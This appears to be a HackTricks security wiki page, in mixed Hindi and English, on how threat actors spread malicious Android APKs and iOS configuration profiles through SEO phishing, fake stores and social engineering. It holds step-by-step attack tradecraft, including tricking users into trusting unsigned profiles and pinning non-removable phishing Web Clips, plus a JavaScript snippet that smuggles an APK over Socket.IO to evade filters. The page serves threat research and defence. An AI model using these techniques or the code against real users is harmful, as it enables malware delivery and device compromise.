# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> यह पेज उन techniques को कवर करता है जिन्हें threat actors **malicious Android APKs** और **iOS mobile-configuration profiles** को phishing (SEO, social engineering, fake stores, dating apps, etc.) के जरिए distribute करने के लिए इस्तेमाल करते हैं।
> यह material Zimperium zLabs (2025) द्वारा exposed SarangTrap campaign और अन्य public research से adapted है।

## Attack Flow

1. **SEO/Phishing Infrastructure**
* दर्जनों look-alike domains (dating, cloud share, car service…) register करें।
– Google में rank करने के लिए `<title>` element में local language keywords और emojis का उपयोग करें।
– एक ही landing page पर *Android* (`.apk`) और iOS install instructions दोनों host करें।
2. **First Stage Download**
* Android: एक *unsigned* या “third-party store” APK का direct link।
* iOS: `itms-services://` या malicious **mobileconfig** profile का plain HTTPS link (नीचे देखें)।
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection, और अन्य post-install malware behaviour नीचे dedicated Android Malware Post-Exploitation page में covered हैं।
4. **iOS Delivery Technique**
* एक single **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` आदि request कर सकता है ताकि device को “MDM”-like supervision में enroll किया जा सके।
* Social-engineering instructions:
1. Settings खोलें ➜ *Profile downloaded*।
2. *Install* पर तीन बार tap करें (phishing page पर screenshots)।
3. Unsigned profile को trust करें ➜ attacker को App Store review के बिना *Contacts* और *Photo* entitlement मिल जाता है।
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads एक branded icon/label के साथ **phishing URL को Home Screen पर pin** कर सकते हैं।
* Web Clips **full-screen** चल सकते हैं (browser UI छिपा देता है) और **non-removable** mark किए जा सकते हैं, जिससे victim को icon हटाने के लिए profile delete करनी पड़ती है।
6. **Network Layer**
* Plain HTTP, अक्सर port 80 पर HOST header जैसे `api.<phishingdomain>.com` के साथ।
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → आसानी से spot किया जा सकता है)।

## Android Malware Post-Exploitation

C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS, और persistence जैसे post-install Android malware tradecraft के लिए देखें:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers अब static APK links की जगह Google Play जैसे दिखने वाले lures में embedded Socket.IO/WebSocket channel का उपयोग increasingly कर रहे हैं। इससे payload URL छिप जाता है, URL/extension filters bypass हो जाते हैं, और realistic install UX बना रहता है।

Wild में observed typical client flow:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

यह साधारण controls को कैसे bypass करता है:
- कोई static APK URL expose नहीं किया जाता; payload को WebSocket frames से memory में reconstruct किया जाता है।
- URL/MIME/extension filters जो direct .apk responses को block करते हैं, वे WebSockets/Socket.IO के जरिए tunneled binary data को miss कर सकते हैं।
- Crawlers और URL sandboxes जो WebSockets execute नहीं करते, payload को retrieve नहीं करेंगे।

WebSocket tradecraft और tooling भी देखें:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References


- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Socket.IO](https://socket.io)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
